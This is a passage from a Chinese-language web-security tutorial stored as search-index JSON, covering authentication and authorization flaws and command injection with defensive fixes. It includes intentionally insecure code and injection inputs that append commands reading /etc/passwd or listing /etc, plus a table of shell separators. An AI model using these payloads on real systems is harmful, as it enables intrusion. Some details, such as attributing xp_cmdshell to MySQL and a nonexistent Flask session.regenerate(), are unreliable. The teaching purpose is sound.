<p>\u98ce\u9669\uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u66b4\u529b\u7834\u89e3\u3001\u5b57\u5178\u653b\u51fb\u6216\u5f69\u8679\u8868\u653b\u51fb\u8f7b\u6613\u83b7\u53d6\u7528\u6237\u8d26\u6237\u8bbf\u95ee\u6743\u9650\u3002</p> <p>\u793a\u4f8b\uff1a - \u5141\u8bb8\u8bbe\u7f6e\u77ed\u5bc6\u7801\uff08\u5c11\u4e8e8\u4e2a\u5b57\u7b26\uff09 - \u4e0d\u8981\u6c42\u5bc6\u7801\u5305\u542b\u7279\u6b8a\u5b57\u7b26\u3001\u6570\u5b57\u6216\u5927\u5c0f\u5199\u5b57\u6bcd - \u4e0d\u9650\u5236\u5e38\u89c1\u5bc6\u7801\u6216\u5f31\u5bc6\u7801</p>"},{"location":"web-security/authentication/#2","title":"2. \u4f1a\u8bdd\u7ba1\u7406\u7f3a\u9677","text":"<p>\u95ee\u9898\uff1a\u4f1a\u8bdd\u6807\u8bc6\u7b26\u751f\u6210\u4e0d\u5b89\u5168\u3001\u4f1a\u8bdd\u56fa\u5b9a\u3001\u4f1a\u8bdd\u52ab\u6301\u7b49\u3002</p> <p>\u98ce\u9669\uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u53d6\u6216\u731c\u6d4b\u6709\u6548\u4f1a\u8bdd\uff0c\u5192\u5145\u5408\u6cd5\u7528\u6237\u3002</p> <p>\u793a\u4f8b\uff1a - \u4f1a\u8bddID\u53ef\u9884\u6d4b\u6216\u57fa\u4e8e\u65f6\u95f4\u6233\u751f\u6210 - \u767b\u5f55\u540e\u4e0d\u91cd\u65b0\u751f\u6210\u4f1a\u8bddID - \u4f1a\u8bdd\u6ca1\u6709\u9002\u5f53\u7684\u8fc7\u671f\u65f6\u95f4</p>"},{"location":"web-security/authentication/#3","title":"3. \u8d26\u6237\u9501\u5b9a\u7f3a\u5931","text":"<p>\u95ee\u9898\uff1a\u672a\u5b9e\u65bd\u5931\u8d25\u767b\u5f55\u5c1d\u8bd5\u6b21\u6570\u9650\u5236\u3002</p> <p>\u98ce\u9669\uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u5bf9\u8d26\u6237\u8fdb\u884c\u65e0\u9650\u5236\u7684\u66b4\u529b\u7834\u89e3\u653b\u51fb\u3002</p>"},{"location":"web-security/authentication/#4","title":"4. \u5bc6\u7801\u91cd\u7f6e\u6f0f\u6d1e","text":"<p>\u95ee\u9898\uff1a\u5bc6\u7801\u91cd\u7f6e\u6d41\u7a0b\u5b9e\u73b0\u4e0d\u5b89\u5168\u3002</p> <p>\u98ce\u9669\uff1a\u653b\u51fb\u8005\u53ef\u80fd\u7ed5\u8fc7\u5bc6\u7801\u91cd\u7f6e\u6d41\u7a0b\uff0c\u91cd\u7f6e\u5176\u4ed6\u7528\u6237\u7684\u5bc6\u7801\u3002</p> <p>\u793a\u4f8b\uff1a - \u5bc6\u7801\u91cd\u7f6e\u4ee4\u724c\u53ef\u9884\u6d4b\u6216\u6709\u6548\u671f\u8fc7\u957f - \u91cd\u7f6e\u94fe\u63a5\u53d1\u9001\u5230\u4e0d\u5b89\u5168\u7684\u6e20\u9053 - \u5141\u8bb8\u901a\u8fc7\u5ba2\u6237\u7aef\u53ef\u63a7\u5236\u7684\u53c2\u6570\u91cd\u7f6e\u5bc6\u7801</p>"},{"location":"web-security/authentication/#5","title":"5. \u591a\u56e0\u7d20\u8ba4\u8bc1\u7f3a\u5931\u6216\u5b9e\u73b0\u4e0d\u5f53","text":"<p>\u95ee\u9898\uff1a\u672a\u5b9e\u65bd\u591a\u56e0\u7d20\u8ba4\u8bc1\u6216\u5b9e\u73b0\u5b58\u5728\u7f3a\u9677\u3002</p> <p>\u98ce\u9669\uff1a\u5373\u4f7f\u5bc6\u7801\u6cc4\u9732\uff0c\u653b\u51fb\u8005\u4e5f\u65e0\u6cd5\u83b7\u53d6\u989d\u5916\u7684\u8ba4\u8bc1\u56e0\u7d20\u3002</p>"},{"location":"web-security/authentication/#_3","title":"\u5e38\u89c1\u7684\u6388\u6743\u6f0f\u6d1e","text":""},{"location":"web-security/authentication/#1_1","title":"1. \u6c34\u5e73\u8d8a\u6743","text":"<p>\u95ee\u9898\uff1a\u7528\u6237\u53ef\u4ee5\u8bbf\u95ee\u6216\u4fee\u6539\u540c\u7ea7\u522b\u5176\u4ed6\u7528\u6237\u7684\u8d44\u6e90\u3002</p> <p>\u98ce\u9669\uff1a\u7528\u6237\u6570\u636e\u6cc4\u9732\u6216\u88ab\u672a\u6388\u6743\u4fee\u6539\u3002</p> <p>\u793a\u4f8b\uff1a <pre><code># \u4e0d\u5b89\u5168\u7684\u4ee3\u7801\u793a\u4f8b\n@app.route('/users/profile', methods=['GET'])\ndef get_user_profile():\n    user_id = request.args.get('user_id')  # \u7528\u6237\u53ef\u4ee5\u4fee\u6539user_id\u53c2\u6570\n    # \u672a\u9a8c\u8bc1\u5f53\u524d\u7528\u6237\u662f\u5426\u6709\u6743\u8bbf\u95ee\u8be5\u7528\u6237ID\u7684\u8d44\u6599\n    user_profile = get_user_from_db(user_id)\n    return render_template('profile.html', profile=user_profile)\n</code></pre></p>"},{"location":"web-security/authentication/#2_1","title":"2. \u5782\u76f4\u8d8a\u6743","text":"<p>\u95ee\u9898\uff1a\u666e\u901a\u7528\u6237\u53ef\u4ee5\u6267\u884c\u7ba1\u7406\u5458\u64cd\u4f5c\u6216\u8bbf\u95ee\u7ba1\u7406\u5458\u8d44\u6e90\u3002</p> <p>\u98ce\u9669\uff1a\u6743\u9650\u63d0\u5347\uff0c\u53ef\u80fd\u5bfc\u81f4\u7cfb\u7edf\u88ab\u5b8c\u5168\u63a7\u5236\u3002</p> <p>\u793a\u4f8b\uff1a <pre><code># \u4e0d\u5b89\u5168\u7684\u4ee3\u7801\u793a\u4f8b\n@app.route('/admin/dashboard', methods=['GET'])\ndef admin_dashboard():\n    # \u672a\u9a8c\u8bc1\u7528\u6237\u662f\u5426\u5177\u6709\u7ba1\u7406\u5458\u6743\u9650\n    return render_template('admin_dashboard.html')\n</code></pre></p>"},{"location":"web-security/authentication/#3_1","title":"3. \u6743\u9650\u68c0\u67e5\u4e0d\u5b8c\u6574","text":"<p>\u95ee\u9898\uff1a\u53ea\u5728\u4e00\u4e2a\u5730\u65b9\u68c0\u67e5\u6743\u9650\uff0c\u5ffd\u7565\u4e86\u5176\u4ed6\u8bbf\u95ee\u8def\u5f84\u3002</p> <p>\u98ce\u9669\uff1a\u653b\u51fb\u8005\u53ef\u80fd\u901a\u8fc7\u5176\u4ed6\u8def\u5f84\u7ed5\u8fc7\u6743\u9650\u68c0\u67e5\u3002</p>"},{"location":"web-security/authentication/#4_1","title":"4. \u53c2\u6570\u7be1\u6539","text":"<p>\u95ee\u9898\uff1a\u5ba2\u6237\u7aef\u53ef\u4ee5\u4fee\u6539\u8868\u793a\u6743\u9650\u7ea7\u522b\u7684\u53c2\u6570\u3002</p> <p>\u98ce\u9669\uff1a\u6743\u9650\u63d0\u5347\uff0c\u8bbf\u95ee\u672a\u6388\u6743\u8d44\u6e90\u3002</p> <p>\u793a\u4f8b\uff1aURL\u4e2d\u7684<code>?role=user</code>\u88ab\u4fee\u6539\u4e3a<code>?role=admin</code></p>"},{"location":"web-security/authentication/#_4","title":"\u8ba4\u8bc1\u4e0e\u6388\u6743\u7684\u9632\u5fa1\u63aa\u65bd","text":""},{"location":"web-security/authentication/#1_2","title":"1. \u5f3a\u5bc6\u7801\u7b56\u7565","text":"<ul> <li>\u5b9e\u65bd\u6700\u5c0f\u5bc6\u7801\u957f\u5ea6\u8981\u6c42\uff08\u81f3\u5c118-12\u4e2a\u5b57\u7b26\uff09</li> <li>\u8981\u6c42\u5bc6\u7801\u5305\u542b\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u6570\u5b57\u548c\u7279\u6b8a\u5b57\u7b26</li> <li>\u7ef4\u62a4\u5e38\u89c1\u5f31\u5bc6\u7801\u9ed1\u540d\u5355</li> <li>\u5b9a\u671f\u8981\u6c42\u7528\u6237\u66f4\u6539\u5bc6\u7801</li> <li>\u5bc6\u7801\u5f3a\u5ea6\u68c0\u67e5</li> </ul> <pre><code># Python\u4e2d\u5bc6\u7801\u5f3a\u5ea6\u68c0\u67e5\u793a\u4f8b\nimport re\n\ndef check_password_strength(password):\n    # \u81f3\u5c118\u4e2a\u5b57\u7b26\n    if len(password) &lt; 8:\n        return False, \"\u5bc6\u7801\u957f\u5ea6\u5fc5\u987b\u81f3\u5c11\u4e3a8\u4e2a\u5b57\u7b26\"\n    # \u5305\u542b\u6570\u5b57\n    if not re.search(r\"\\d\", password):\n        return False, \"\u5bc6\u7801\u5fc5\u987b\u5305\u542b\u6570\u5b57\"\n    # \u5305\u542b\u5c0f\u5199\u5b57\u6bcd\n    if not re.search(r\"[a-z]\", password):\n        return False, \"\u5bc6\u7801\u5fc5\u987b\u5305\u542b\u5c0f\u5199\u5b57\u6bcd\"\n    # \u5305\u542b\u5927\u5199\u5b57\u6bcd\n    if not re.search(r\"[A-Z]\", password):\n        return False, \"\u5bc6\u7801\u5fc5\u987b\u5305\u542b\u5927\u5199\u5b57\u6bcd\"\n    # \u5305\u542b\u7279\u6b8a\u5b57\u7b26\n    if not re.search(r\"[!@#$%^&amp;*(),.?\\\":{}|&lt;&gt;]\", password):\n        return False, \"\u5bc6\u7801\u5fc5\u987b\u5305\u542b\u7279\u6b8a\u5b57\u7b26\"\n    return True, \"\u5bc6\u7801\u5f3a\u5ea6\u826f\u597d\"\n</code></pre>"},{"location":"web-security/authentication/#2_2","title":"2. \u5b89\u5168\u7684\u4f1a\u8bdd\u7ba1\u7406","text":"<ul> <li>\u4f7f\u7528\u5f3a\u968f\u673a\u6570\u751f\u6210\u5668\u521b\u5efa\u4e0d\u53ef\u9884\u6d4b\u7684\u4f1a\u8bddID</li> <li>\u767b\u5f55\u540e\u91cd\u65b0\u751f\u6210\u4f1a\u8bddID</li> <li>\u8bbe\u7f6e\u9002\u5f53\u7684\u4f1a\u8bdd\u8d85\u65f6\u65f6\u95f4</li> <li>\u5b9e\u73b0\u4f1a\u8bdd\u56fa\u5b9a\u9632\u62a4</li> <li>\u4f7f\u7528HttpOnly\u548cSecure Cookie</li> </ul> <pre><code># Flask\u4e2d\u5b89\u5168\u7684\u4f1a\u8bdd\u7ba1\u7406\u793a\u4f8b\nfrom flask import Flask, session, redirect, url_for\nimport secrets\n\napp = Flask(__name__)\napp.secret_key = secrets.token_hex(32)  # \u5f3a\u968f\u673a\u5bc6\u94a5\napp.config['PERMANENT_SESSION_LIFETIME'] = 1800  # \u4f1a\u8bdd30\u5206\u949f\u540e\u8fc7\u671f\n\n@app.route('/login', methods=['POST'])\ndef login():\n    # \u9a8c\u8bc1\u7528\u6237\u51ed\u636e\n    if authenticate_user(username, password):\n        # \u9500\u6bc1\u65e7\u4f1a\u8bdd\n        session.clear()\n        # \u91cd\u65b0\u751f\u6210\u4f1a\u8bddID\uff08\u9632\u6b62\u4f1a\u8bdd\u56fa\u5b9a\u653b\u51fb\uff09\n        session.regenerate()\n        # \u8bbe\u7f6e\u7528\u6237\u4fe1\u606f\n        session['user_id'] = user.id\n        session['authenticated'] = True\n        return redirect(url_for('dashboard'))\n</code></pre>"},{"location":"web-security/authentication/#3_2","title":"3. \u5b9e\u65bd\u8d26\u6237\u9501\u5b9a","text":"<ul> <li>\u9650\u5236\u5931\u8d25\u767b\u5f55\u5c1d\u8bd5\u6b21\u6570\uff08\u59825\u6b21\uff09</li> <li>\u9501\u5b9a\u8d26\u6237\u4e00\u6bb5\u65f6\u95f4\uff08\u598215\u5206\u949f\uff09\u6216\u76f4\u5230\u7ba1\u7406\u5458\u89e3\u9501</li> <li>\u5411\u7528\u6237\u548c\u7ba1\u7406\u5458\u53d1\u9001\u53ef\u7591\u6d3b\u52a8\u901a\u77e5</li> </ul>"},{"location":"web-security/authentication/#4_2","title":"4. \u5b89\u5168\u7684\u5bc6\u7801\u91cd\u7f6e\u6d41\u7a0b","text":"<ul> <li>\u4f7f\u7528\u5f3a\u968f\u673a\u4ee4\u724c\u8fdb\u884c\u5bc6\u7801\u91cd\u7f6e</li> <li>\u8bbe\u7f6e\u77ed\u65f6\u95f4\u7684\u4ee4\u724c\u6709\u6548\u671f\uff08\u598230\u5206\u949f\uff09</li> <li>\u786e\u4fdd\u4ee4\u724c\u53ea\u4f7f\u7528\u4e00\u6b21</li> <li>\u9a8c\u8bc1\u7528\u6237\u8eab\u4efd\u540e\u518d\u53d1\u9001\u91cd\u7f6e\u94fe\u63a5</li> <li>\u901a\u8fc7\u5b89\u5168\u6e20\u9053\u53d1\u9001\u91cd\u7f6e\u94fe\u63a5</li> </ul>"},{"location":"web-security/authentication/#5_1","title":"5. \u591a\u56e0\u7d20\u8ba4\u8bc1","text":"<ul> <li>\u5b9e\u65bdSMS\u9a8c\u8bc1\u7801\u3001\u7535\u5b50\u90ae\u4ef6\u9a8c\u8bc1\u7801\u6216\u8ba4\u8bc1\u5e94\u7528\u7b49\u591a\u56e0\u7d20\u8ba4\u8bc1</li> <li>\u5bf9\u654f\u611f\u64cd\u4f5c\uff08\u5982\u5927\u989d\u8f6c\u8d26\u3001\u4fee\u6539\u4e2a\u4eba\u4fe1\u606f\uff09\u8981\u6c42\u989d\u5916\u9a8c\u8bc1</li> </ul>"},{"location":"web-security/authentication/#6","title":"6. \u5b9e\u65bd\u4e25\u683c\u7684\u6388\u6743\u63a7\u5236","text":"<ul> <li>\u5728\u6240\u6709\u8d44\u6e90\u8bbf\u95ee\u70b9\u5b9e\u65bd\u6743\u9650\u68c0\u67e5</li> <li>\u4f7f\u7528\u57fa\u4e8e\u89d2\u8272\u7684\u8bbf\u95ee\u63a7\u5236\uff08RBAC\uff09</li> <li>\u9a8c\u8bc1\u7528\u6237\u8eab\u4efd\u548c\u6743\u9650\u540e\u518d\u5904\u7406\u8bf7\u6c42</li> </ul> <pre><code># \u57fa\u4e8e\u89d2\u8272\u7684\u8bbf\u95ee\u63a7\u5236\u793a\u4f8b\nfrom functools import wraps\n\ndef require_role(role):\n    def decorator(f):\n        @wraps(f)\n        def decorated_function(*args, **kwargs):\n            # \u68c0\u67e5\u7528\u6237\u662f\u5426\u5df2\u8ba4\u8bc1\n            if 'authenticated' not in session or not session['authenticated']:\n                return redirect(url_for('login'))\n\n            # \u68c0\u67e5\u7528\u6237\u89d2\u8272\n            user_role = get_user_role(session['user_id'])\n            if user_role != role:\n                return \"\u65e0\u6743\u8bbf\u95ee\", 403\n\n            return f(*args, **kwargs)\n        return decorated_function\n    return decorator\n\n# \u4f7f\u7528\n@app.route('/admin/dashboard')\n@require_role('admin')\ndef admin_dashboard():\n    return render_template('admin_dashboard.html')\n\n# \u9632\u6b62\u6c34\u5e73\u8d8a\u6743\n@app.route('/users/profile/&lt;int:user_id&gt;')\ndef get_user_profile(user_id):\n    # \u68c0\u67e5\u662f\u5426\u8bbf\u95ee\u81ea\u5df1\u7684\u8d44\u6599\u6216\u5177\u6709\u7ba1\u7406\u5458\u6743\u9650\n    if session['user_id'] != user_id and get_user_role(session['user_id']) != 'admin':\n        return \"\u65e0\u6743\u8bbf\u95ee\", 403\n    user_profile = get_user_from_db(user_id)\n    return render_template('profile.html', profile=user_profile)\n</code></pre>"},{"location":"web-security/authentication/#_5","title":"\u5b89\u5168\u7f16\u7801\u6700\u4f73\u5b9e\u8df5","text":"<ol> <li>\u6c38\u8fdc\u4e0d\u8981\u5728\u5ba2\u6237\u7aef\u5b58\u50a8\u654f\u611f\u6570\u636e\uff1a\u5982\u5bc6\u7801\u6216\u6743\u9650\u7ea7\u522b</li> <li>\u59cb\u7ec8\u5728\u670d\u52a1\u5668\u7aef\u9a8c\u8bc1\u6743\u9650\uff1a\u4e0d\u8981\u4f9d\u8d56\u5ba2\u6237\u7aef\u7684\u6743\u9650\u68c0\u67e5</li> <li>\u4f7f\u7528\u5b89\u5168\u7684\u5bc6\u7801\u5b58\u50a8\uff1a\u4f7f\u7528bcrypt\u3001Argon2\u7b49\u5f3a\u54c8\u5e0c\u7b97\u6cd5\u5b58\u50a8\u5bc6\u7801</li> <li>\u5b9e\u65bd\u5168\u9762\u7684\u65e5\u5fd7\u8bb0\u5f55\uff1a\u8bb0\u5f55\u6240\u6709\u8ba4\u8bc1\u548c\u6388\u6743\u64cd\u4f5c\uff0c\u4fbf\u4e8e\u5ba1\u8ba1\u548c\u76d1\u63a7</li> <li>\u5b9a\u671f\u8fdb\u884c\u5b89\u5168\u5ba1\u67e5\uff1a\u68c0\u67e5\u8ba4\u8bc1\u548c\u6388\u6743\u673a\u5236\u7684\u5b9e\u73b0</li> <li>\u4f7f\u7528\u6210\u719f\u7684\u8eab\u4efd\u9a8c\u8bc1\u5e93\uff1a\u907f\u514d\u81ea\u884c\u5b9e\u73b0\u590d\u6742\u7684\u8ba4\u8bc1\u673a\u5236</li> </ol>"},{"location":"web-security/authentication/#_6","title":"\u603b\u7ed3","text":"<p>\u8ba4\u8bc1\u4e0e\u6388\u6743\u662fWeb\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u7684\u57fa\u7840\uff0c\u5b9e\u73b0\u4e0d\u5f53\u53ef\u80fd\u5bfc\u81f4\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\u3002\u901a\u8fc7\u5b9e\u65bd\u5f3a\u5bc6\u7801\u7b56\u7565\u3001\u5b89\u5168\u7684\u4f1a\u8bdd\u7ba1\u7406\u3001\u4e25\u683c\u7684\u6388\u6743\u63a7\u5236\u7b49\u63aa\u65bd\uff0c\u53ef\u4ee5\u6709\u6548\u5730\u4fdd\u62a4Web\u5e94\u7528\u7a0b\u5e8f\u514d\u53d7\u672a\u6388\u6743\u8bbf\u95ee\u548c\u6743\u9650\u63d0\u5347\u653b\u51fb\u3002\u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\uff0c\u5e94\u5f53\u59cb\u7ec8\u5c06\u5b89\u5168\u653e\u5728\u9996\u4f4d\uff0c\u786e\u4fdd\u8ba4\u8bc1\u548c\u6388\u6743\u673a\u5236\u7684\u6b63\u786e\u5b9e\u73b0\u3002</p>"},{"location":"web-security/command-injection/","title":"\u547d\u4ee4\u6ce8\u5165 (Command Injection)","text":""},{"location":"web-security/command-injection/#_1","title":"\u4ec0\u4e48\u662f\u547d\u4ee4\u6ce8\u5165\uff1f","text":"<p>\u547d\u4ee4\u6ce8\u5165\u662f\u4e00\u79cd\u5b89\u5168\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u5728Web\u5e94\u7528\u7a0b\u5e8f\u4e2d\u63d2\u5165\u6076\u610f\u547d\u4ee4\uff0c\u4f7f\u670d\u52a1\u5668\u6267\u884c\u8fd9\u4e9b\u547d\u4ee4\u3002\u8fd9\u79cd\u6f0f\u6d1e\u901a\u5e38\u53d1\u751f\u5728\u5e94\u7528\u7a0b\u5e8f\u8c03\u7528\u7cfb\u7edf\u547d\u4ee4\u6765\u5904\u7406\u7528\u6237\u8f93\u5165\uff0c\u4f46\u6ca1\u6709\u6b63\u786e\u9a8c\u8bc1\u6216\u8fc7\u6ee4\u8fd9\u4e9b\u8f93\u5165\u7684\u60c5\u51b5\u4e0b\u3002</p> <p>\u547d\u4ee4\u6ce8\u5165\u653b\u51fb\u53ef\u80fd\u5bfc\u81f4\u670d\u52a1\u5668\u88ab\u5b8c\u5168\u63a7\u5236\uff0c\u5305\u62ec\u6570\u636e\u6cc4\u9732\u3001\u670d\u52a1\u4e2d\u65ad\u3001\u6743\u9650\u63d0\u5347\u7b49\u4e25\u91cd\u540e\u679c\u3002</p>"},{"location":"web-security/command-injection/#_2","title":"\u547d\u4ee4\u6ce8\u5165\u7684\u5de5\u4f5c\u539f\u7406","text":"<p>\u547d\u4ee4\u6ce8\u5165\u7684\u6838\u5fc3\u539f\u7406\u662f\u5e94\u7528\u7a0b\u5e8f\u5c06\u7528\u6237\u8f93\u5165\u76f4\u63a5\u4f20\u9012\u7ed9\u7cfb\u7edf\u547d\u4ee4\u6267\u884c\u51fd\u6570\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5728\u8f93\u5165\u4e2d\u6dfb\u52a0\u7279\u6b8a\u5b57\u7b26\uff08\u5982\u5206\u53f7\u3001\u7ba1\u9053\u7b26\u7b49\uff09\u6765\u7ec8\u6b62\u539f\u59cb\u547d\u4ee4\u5e76\u6267\u884c\u81ea\u5df1\u7684\u547d\u4ee4\u3002</p>"},{"location":"web-security/command-injection/#_3","title":"\u5e38\u89c1\u7684\u547d\u4ee4\u6ce8\u5165\u573a\u666f","text":"<ol> <li>\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u6267\u884c\uff1a\u5e94\u7528\u7a0b\u5e8f\u8c03\u7528<code>system()</code>\u3001<code>exec()</code>\u7b49\u51fd\u6570\u6267\u884c\u7cfb\u7edf\u547d\u4ee4</li> <li>\u6570\u636e\u5e93\u547d\u4ee4\u6267\u884c\uff1a\u901a\u8fc7\u6570\u636e\u5e93\u6267\u884c\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\uff08\u5982MySQL\u7684<code>xp_cmdshell</code>\uff09</li> <li>\u7f51\u7edc\u547d\u4ee4\u6267\u884c\uff1a\u5e94\u7528\u7a0b\u5e8f\u8c03\u7528\u7f51\u7edc\u76f8\u5173\u547d\u4ee4\u5904\u7406\u7528\u6237\u8f93\u5165</li> <li>\u6587\u4ef6\u64cd\u4f5c\u547d\u4ee4\u6267\u884c\uff1a\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u547d\u4ee4\u884c\u5de5\u5177\u8fdb\u884c\u6587\u4ef6\u64cd\u4f5c</li> </ol>"},{"location":"web-security/command-injection/#_4","title":"\u547d\u4ee4\u6ce8\u5165\u793a\u4f8b","text":""},{"location":"web-security/command-injection/#python","title":"Python\u4e2d\u7684\u547d\u4ee4\u6ce8\u5165","text":"<p>\u5047\u8bbe\u6709\u4ee5\u4e0bPython\u4ee3\u7801\uff0c\u7528\u4e8eping\u4e00\u4e2aIP\u5730\u5740\uff1a</p> <pre><code># \u4e0d\u5b89\u5168\u7684Python\u4ee3\u7801\u793a\u4f8b\nimport os\n\nip_address = request.form['ip_address']\ncommand = f\"ping -c 4 {ip_address}\"\nresult = os.system(command)  # \u5371\u9669\uff1a\u76f4\u63a5\u6267\u884c\u7528\u6237\u8f93\u5165\u7684\u547d\u4ee4\n</code></pre> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u8f93\u5165\u4ee5\u4e0b\u5185\u5bb9\u6765\u6267\u884c\u989d\u5916\u7684\u547d\u4ee4\uff1a</p> <pre><code>127.0.0.1; cat /etc/passwd\n</code></pre> <p>\u751f\u6210\u7684\u547d\u4ee4\u5c06\u53d8\u6210\uff1a <pre><code>ping -c 4 127.0.0.1; cat /etc/passwd\n</code></pre></p> <p>\u8fd9\u5c06\u9996\u5148ping\u672c\u5730\u4e3b\u673a\uff0c\u7136\u540e\u663e\u793a\u7cfb\u7edf\u7684\u5bc6\u7801\u6587\u4ef6\u3002</p>"},{"location":"web-security/command-injection/#php","title":"PHP\u4e2d\u7684\u547d\u4ee4\u6ce8\u5165","text":"<p>\u5047\u8bbe\u6709\u4ee5\u4e0bPHP\u4ee3\u7801\uff1a</p> <pre><code>&lt;?php\n// \u4e0d\u5b89\u5168\u7684PHP\u4ee3\u7801\u793a\u4f8b\n$filename = $_GET['filename'];\n$result = shell_exec(\"cat /var/www/uploads/\" . $filename);\n?&gt;\n</code></pre> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u8f93\u5165\uff1a <pre><code>; ls -la /etc/\n</code></pre></p> <p>\u751f\u6210\u7684\u547d\u4ee4\u5c06\u53d8\u6210\uff1a <pre><code>cat /var/www/uploads/; ls -la /etc/\n</code></pre></p> <p>\u8fd9\u5c06\u663e\u793a<code>/etc/</code>\u76ee\u5f55\u4e2d\u7684\u6240\u6709\u6587\u4ef6\u3002</p>"},{"location":"web-security/command-injection/#_5","title":"\u5e38\u89c1\u7684\u547d\u4ee4\u5206\u9694\u7b26","text":"<p>\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5e38\u7528\u7684\u547d\u4ee4\u5206\u9694\u7b26\uff1a</p> \u5206\u9694\u7b26 \u4f5c\u7528 \u9002\u7528\u64cd\u4f5c\u7cfb\u7edf ; \u987a\u5e8f\u6267\u884c\u591a\u4e2a\u547d\u4ee4 Unix/Linux, Windows &amp; \u540e\u53f0\u6267\u884c\u547d\u4ee4 Unix/Linux, Windows &amp;&amp; \u53ea\u6709\u524d\u4e00\u4e2a\u547d\u4ee4\u6210\u529f\u6267\u884c\u624d\u6267\u884c\u4e0b\u4e00\u4e2a\u547d\u4ee4 Unix/Linux, Windows | \u7ba1\u9053\uff0c\u5c06\u524d\u4e00\u4e2a\u547d\u4ee4\u7684\u8f93\u51fa\u4f5c\u4e3a\u540e\u4e00\u4e2a\u547d\u4ee4\u7684\u8f93\u5165 Unix/Linux, Windows || \u53ea\u6709\u524d\u4e00\u4e2a\u547d\u4ee4\u6267\u884c\u5931\u8d25\u624d\u6267\u884c\u4e0b\u4e00\u4e2a\u547d\u4ee4 Unix/Linux, Windows $() \u547d\u4ee4\u66ff\u6362\uff0c\u6267\u884c\u62ec\u53f7\u5185\u7684\u547d\u4ee4\u5e76\u8fd4\u56de\u7ed3\u679c Unix/Linux <code>`</code> \u547d\u4ee4\u66ff\u6362\uff0c\u6267\u884c\u53cd\u5f15\u53f7\u5185\u7684\u547d\u4ee4\u5e76\u8fd4\u56de\u7ed3\u679c Unix/Linux \\ \u547d\u4ee4\u6362\u884c\u7b26 Unix/Linux, Windows"},{"location":"web-security/command-injection/#_6","title":"\u547d\u4ee4\u6ce8\u5165\u7684\u9632\u5fa1\u63aa\u65bd","text":""},{"location":"web-security/command-injection/#1","title":"1. \u907f\u514d\u76f4\u63a5\u6267\u884c\u7cfb\u7edf\u547d\u4ee4","text":"<p>\u5c3d\u53ef\u80fd\u907f\u514d\u5728\u5e94\u7528\u7a0b\u5e8f\u4e2d\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002\u8003\u8651\u4f7f\u7528\u7f16\u7a0b\u8bed\u8a00\u63d0\u4f9b\u7684API\u6765\u5b8c\u6210\u76f8\u540c\u7684\u4efb\u52a1\u3002</p> <pre><code># \u4f7f\u7528Python\u7684subprocess\u6a21\u5757\u7684\u5b89\u5168\u65b9\u5f0f\nimport subprocess\n\ndef ping_host(ip_address):\n    # \u53ea\u5141\u8bb8IP\u5730\u5740\u683c\u5f0f\u7684\u8f93\u5165\n    import re\n    if not re.match(r'^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$', ip_address):\n        raise ValueError(\"Invalid IP address format\")\n\n    # \u4f7f\u7528\u53c2\u6570\u5217\u8868\u800c\u4e0d\u662f\u5b57\u7b26\u4e32\n    result = subprocess.run(['ping', '-c', '4', ip_address], \n                          stdout=subprocess.PIPE, \n                          stderr=subprocess.PIPE,\n                          text=True)\n    return result.stdout\n</code></pre>"},{"location":"web-security/command-injection/#2","title":"2. \u4f7f\u7528\u767d\u540d\u5355\u9a8c\u8bc1","text":"<p>\u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u4e25\u683c\u7684\u767d\u540d\u5355\u9a8c\u8bc1\uff0c\u53ea\u5141\u8bb8\u9884\u671f\u7684\u5b57\u7b26\u6216\u683c\u5f0f\u3002</p> <pre><code># \u767d\u540d\u5355\u9a8c\u8bc1\u793a\u4f8b\nimport re\n\ndef validate_input(input_str):\n    # \u53ea\u5141\u8bb8\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u70b9\u548c\u8fde\u5b57\u7b26\n    if not re.match(r'^[a-zA-Z0-9.-]+$', input_str):\n        raise ValueError(\"Invalid input format\")\n    return input_str\n\nip_address = request.form['ip_address']\nvalid_ip = validate_input(ip_address)\n# \u73b0\u5728\u53ef\u4ee5\u5b89\u5168\u5730\u4f7f\u7528valid_ip\n</code></pre>"},{"location":"web-security/command-injection/#3-api","title":"3. \u4f7f\u7528\u5b89\u5168\u7684\u51fd\u6570\u548cAPI","text":"<p>\u4f7f\u7528\u7f16\u7a0b\u8bed\u8a00\u63d0\u4f9b\u7684\u5b89\u5168\u51fd\u6570\uff0c\u907f\u514d\u4f7f\u7528\u5bb9\u6613\u5bfc\u81f4\u547d\u4ee4\u6ce8\u5165\u7684\u51fd\u6570\uff1a</p> <ul> <li>\u4e0d\u5b89\u5168\u7684\u51fd\u6570\uff1a<code>system()</code>, <code>exec()</code>, <code>`</code> (\u53cd\u5f15\u53f7), <code>shell_exec()</code>\u7b49</li> <li>\u5b89\u5168\u7684\u51fd\u6570\uff1a</li> <li>Python: <code>subprocess.run()</code>\uff08\u5e26\u53c2\u6570\u5217\u8868\uff09</li> <li>PHP: <code>exec()</code>\uff08\u5e26\u6570\u7ec4\u53c2\u6570\uff09, <code>proc_open()</code>\uff08\u5e26\u63cf\u8ff0\u7b26\uff09</li> <li>Node.js: <code>child_process.execFile()</code></li> </ul>"},{"location":"web-security/command-injection/#4","title":"4. 